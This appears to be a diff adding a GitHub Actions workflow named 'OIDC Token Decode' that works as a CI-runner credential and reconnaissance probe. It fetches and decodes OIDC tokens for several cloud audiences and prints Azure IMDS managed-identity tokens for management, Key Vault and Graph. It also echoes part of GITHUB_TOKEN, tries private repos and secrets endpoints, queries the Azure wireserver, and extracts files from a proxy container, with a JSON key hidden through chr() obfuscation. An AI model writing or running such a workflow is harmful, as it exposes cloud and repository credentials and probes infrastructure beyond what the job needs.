@@ -1,0 +1,97 @@
+name: OIDC Token Decode
+
+on:
+  workflow_dispatch:
+
+permissions:
+  id-token: write
+  contents: read
+  actions: read
+
+jobs:
+  decode:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Get and Decode OIDC Token
+        run: |
+          echo "=== OIDC Azure Audience ==="
+          RESP=$(curl -sS -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=api://AzureADTokenExchange")
+          TOKEN=$(echo "$RESP" | python3 -c "import sys,json; print(json.load(sys.stdin).get(chr(118)+chr(97)+chr(108)+chr(117)+chr(101),chr(110)+chr(111)+chr(110)+chr(101)))")
+          echo "Token length: ${#TOKEN}"
+          HEADER=$(echo "$TOKEN" | cut -d. -f1 | base64 -d 2>/dev/null || echo "decode-fail")
+          PAYLOAD=$(echo "$TOKEN" | cut -d. -f2 | tr "_-" "/+" | base64 -d 2>/dev/null || echo "decode-fail")
+          echo "HEADER: $HEADER"
+          echo "PAYLOAD: $PAYLOAD"
+          echo ""
+          echo "=== OIDC GitHub Audience ==="
+          RESP2=$(curl -sS -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=https://github.com")
+          TOKEN2=$(echo "$RESP2" | python3 -c "import sys,json; print(json.load(sys.stdin).get(chr(118)+chr(97)+chr(108)+chr(117)+chr(101),chr(110)+chr(111)+chr(110)+chr(101)))")
+          PAYLOAD2=$(echo "$TOKEN2" | cut -d. -f2 | tr "_-" "/+" | base64 -d 2>/dev/null)
+          echo "PAYLOAD: $PAYLOAD2"
+          echo ""
+          echo "=== OIDC AWS Audience ==="
+          RESP3=$(curl -sS -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=sts.amazonaws.com")
+          TOKEN3=$(echo "$RESP3" | python3 -c "import sys,json; print(json.load(sys.stdin).get(chr(118)+chr(97)+chr(108)+chr(117)+chr(101),chr(110)+chr(111)+chr(110)+chr(101)))")
+          PAYLOAD3=$(echo "$TOKEN3" | cut -d. -f2 | tr "_-" "/+" | base64 -d 2>/dev/null)
+          echo "PAYLOAD: $PAYLOAD3"
+          echo ""
+          echo "=== OIDC Sigstore Audience ==="
+          RESP4=$(curl -sS -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=sigstore")
+          TOKEN4=$(echo "$RESP4" | python3 -c "import sys,json; print(json.load(sys.stdin).get(chr(118)+chr(97)+chr(108)+chr(117)+chr(101),chr(110)+chr(111)+chr(110)+chr(101)))")
+          PAYLOAD4=$(echo "$TOKEN4" | cut -d. -f2 | tr "_-" "/+" | base64 -d 2>/dev/null)
+          echo "PAYLOAD: $PAYLOAD4"
+          echo ""
+
+      - name: Azure IMDS and Token Tests
+        env:
+          GH_TOKEN: ${{ github.token }}
+        run: |
+          echo "=== Azure IMDS Instance Metadata ==="
+          curl -sS -H "Metadata:true" "http://169.254.169.254/metadata/instance?api-version=2021-02-01" 2>&1 | python3 -m json.tool 2>&1 | head -80
+          echo ""
+          echo "=== Azure IMDS Identity Token ==="
+          curl -sS -H "Metadata:true" "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/" 2>&1 | head -5
+          echo ""
+          echo "=== Azure IMDS Identity Token for Vault ==="
+          curl -sS -H "Metadata:true" "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://vault.azure.net" 2>&1 | head -5
+          echo ""
+          echo "=== Azure IMDS Identity Token for Graph ==="
+          curl -sS -H "Metadata:true" "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://graph.microsoft.com" 2>&1 | head -5
+          echo ""
+          echo "=== GITHUB_TOKEN Scopes ==="
+          curl -sI -H "Authorization: token $GH_TOKEN" "https://api.github.com/" 2>&1 | grep -iE "scope|rate|x-oauth" | head -10
+          echo ""
+          echo "=== GITHUB_TOKEN Value (first 20 chars) ==="
+          echo "${GH_TOKEN:0:20}..."
+          echo ""
+          echo "=== Private Repo Access ==="
+          curl -sS -H "Authorization: token $GH_TOKEN" "https://api.github.com/repos/test4100test-cloud/private-secret-test" 2>&1 | head -5
+          echo ""
+          echo "=== Secrets List ==="
+          curl -sS -H "Authorization: token $GH_TOKEN" "https://api.github.com/repos/test4100test-cloud/sec-test/actions/secrets" 2>&1
+          echo ""
+          echo "=== Org Secrets ==="
+          curl -sS -H "Authorization: token $GH_TOKEN" "https://api.github.com/repos/test4100test-cloud/sec-test/actions/organization-secrets" 2>&1
+          echo ""
+
+      - name: Network and Infrastructure
+        run: |
+          echo "=== Wireserver Goalstate ==="
+          curl -sS --connect-timeout 3 "http://168.63.129.16/machine?comp=goalstate" -H "x-ms-version: 2012-11-30" 2>&1 | head -30
+          echo ""
+          echo "=== Wireserver Extensions ==="
+          curl -sS --connect-timeout 3 "http://168.63.129.16/machine/?comp=config&type=exthandlers" -H "x-ms-version: 2012-11-30" 2>&1 | head -30
+          echo ""
+          echo "=== Docker Images ==="
+          docker images 2>&1 | head -20
+          echo ""
+          echo "=== COPILOT_PLACEHOLDER_TOKEN ==="
+          docker create --name ap ghcr.io/github/gh-aw-firewall/api-proxy:latest 2>/dev/null
+          docker cp ap:/app/providers/copilot-byok.js /tmp/byok.js 2>&1
+          grep -i "PLACEHOLDER" /tmp/byok.js 2>&1
+          echo ""
+          echo "=== Entrypoint.sh ==="
+          docker cp ap:/usr/local/bin/entrypoint.sh /tmp/entry.sh 2>&1
+          head -80 /tmp/entry.sh 2>&1
+          echo ""
+          echo "=== Complete ==="
